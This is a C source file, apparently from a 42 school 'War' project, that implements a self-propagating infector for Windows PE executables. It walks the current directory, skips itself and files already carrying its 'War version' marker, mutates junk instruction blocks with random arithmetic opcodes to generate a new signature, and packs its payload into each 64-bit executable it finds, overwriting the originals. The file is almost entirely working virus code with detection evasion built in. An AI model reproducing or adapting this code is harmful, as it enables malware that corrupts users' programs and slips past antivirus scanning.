/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

int seed = 0;
int next_n = 0;

int get_seed(void)
{
	next_n += 2;
	return (seed + next_n);
}

bool		replace_sequence_to_infection(int sequence, char *infection_content, int infection_size) {
	char patt[] = { 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e };//War version
	for (int i = 0; i < infection_size - sizeof(patt); i++) {
		if (memcmp(infection_content + i, patt, sizeof(patt)) == 0) {
			int offset = i + sizeof(patt) + 40;
			char *ptr = infection_content + offset;

			char *ss = ft_strnew(3 * 3);
			asprintf(&ss, "%d%d%d", sequence, sequence, sequence);
			memcpy(infection_content + offset, ss, 3 * 3);
			free(ss);
			return true;
		}
	}
	return false;
}

bool		is_infected_executable(char *executable_content, int executable_size) {

	if (find_pattern(executable_content, executable_size) != -1)//is file infected
	{
		return (true);
	}
	char patt[] = { 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e };//War version
	for (int i = 0; i < executable_size - sizeof(patt); i++) {
		if (memcmp(executable_content + i, patt, sizeof(patt)) == 0) {
			return (true);
		}
	}
	return (false);
}

void		writeinstruction(char *executable_content, unsigned reg) {

	const unsigned char asm_instructions[] = { ADD,AND,XOR,OR,SBB,SUB,0 };

	executable_content[0] = asm_instructions[get_seed() % (sizeof(asm_instructions) - 1)];
	executable_content[1] = 0xC0 + get_seed() % 8 * 8 + reg;
}

int			generate_new_signature(char **new_executableP, char *executable_content, int executable_content_size) {
	char *new_exe = ft_strnew(executable_content_size);

	memcpy(new_exe, executable_content, executable_content_size);

	for (int i = 4096; i < executable_content_size - (ASM_JUNK_LEN + 2); i++)
	{
		unsigned char push_rax_instruction = new_exe[i + 0];
		unsigned char pop_rax_instruction = new_exe[i + (ASM_JUNK_LEN + 1)];
		unsigned char push_rbx_instruction = new_exe[i + 9];
		unsigned char pop_rbx_instruction = new_exe[i + (ASM_JUNK_LEN)];

		unsigned char reg_rax = push_rax_instruction - PUSH;

		if (push_rax_instruction != PUSH_RAX || pop_rax_instruction != POP_RAX)
			continue ;
		if (push_rbx_instruction != PUSH_RCX || pop_rbx_instruction != POP_RCX)
			continue ;
		int nNop = 0;
		int block = 0;
		for (int _i = 0; _i < ASM_JUNK_LEN; _i++) {
			unsigned char instruction = new_exe[(i + 1) + _i];
			if (instruction == NOP)
				nNop++;
		}
		if (nNop >= 0) {//4 NOP instruction or 8
			memset(new_exe + i + 1, NOP, 8);//8 first bits
			memset(new_exe + i + 1 + 9, NOP, 8);//8 end bits
			printf("offset(0x%x) nNop : %d, reg:%d\n", (i - 4096) + 4194304, nNop, reg_rax);
			writeinstruction((new_exe + i + 1), 0);//one instruction of 2bits
			writeinstruction((new_exe + i + 1) + 2, 0);
			writeinstruction((new_exe + i + 1) + 4, 0);
			writeinstruction((new_exe + i + 1) + 6, 0);
			writeinstruction((new_exe + i + 1) + 9, 1);
			writeinstruction((new_exe + i + 1) + 11, 1);
			writeinstruction((new_exe + i + 1) + 13, 1);
			writeinstruction((new_exe + i + 1) + 15, 1);
		}
	}
	*new_executableP = new_exe;
	return (executable_content_size);
}

/*
** Infect windows Portable executable
*/
bool		infect_pe_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	if (is_pe_x64(img->pe_header) == false)
		return (false);
	if (img->pe_header->FileHeader.Characteristics & IMAGE_FILE_DLL)
		return (false);
	if (is_infected_executable(img->buffer, img->len) == true)//is file infected
	{
		printf("File \"%s\" is already infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
		return (false);
	}
	char *new_infection = NULL;
	int new_infection_size = generate_new_signature(&new_infection, infection_content, infection_size);

	img->new_buffer_len = pack_executables(&img->new_buffer, new_infection, new_infection_size, img->buffer, img->len);
	printf("File \"%s\" infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
	return (true);
}

/*
** Infect MS-DOS executable
*/
bool		infect_dos_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	bool result = false;
	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
		return (false);
	}
	img->dos_header = (IMAGE_DOS_HEADER*)img->buffer;
	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
	if (is_pe_signature(img->pe_header))
	{
		result = infect_pe_file(argv, img, infection_content, infection_size);
	}
	free(img);
	return (result);
}

/*
** Infect PE or MS-DOS windows files
*/
bool		infect_file(char *argv, char *file_path, char *infection_content, int infection_size) {
	char	*file = NULL;
	size_t	size = windows_file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	seed += (int)size;
	if (file_type == IS_DOS_BINARY_TYPE) {
		IMAGE_DOS *img = (struct _IMAGE_DOS*)malloc(sizeof(struct _IMAGE_DOS));

		if (img == NULL)
			return (false);
		img->buffer = file;
		img->len = size;
		img->name = file_path;
		return infect_dos_file(argv, img, infection_content, infection_size);
	}
	return false;
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(char *argv, char *infection_content, int infection_size, int sequence) {
	char **files = NULL;
	char *prog_bname = file_base_name(argv);

	files = get_files_types(files, ".", is_windows_binary_file);
	for (int i = 0; files[i]; i++) {
		char *file_bname = file_base_name(files[i]);
		if (strcmp(file_bname, prog_bname) == 0) {
			free(file_bname);
			continue ;
		}
		seed = sequence;
		next_n = 0;
		sequence++;
		if (sequence >= 1000)
			sequence = 100;
		replace_sequence_to_infection(sequence, infection_content, infection_size);
		if (infect_file(argv, files[i], infection_content, infection_size) == false) {
			sequence--;
		}
		free(file_bname);
	}
	free_array(files);
	free(prog_bname);
}
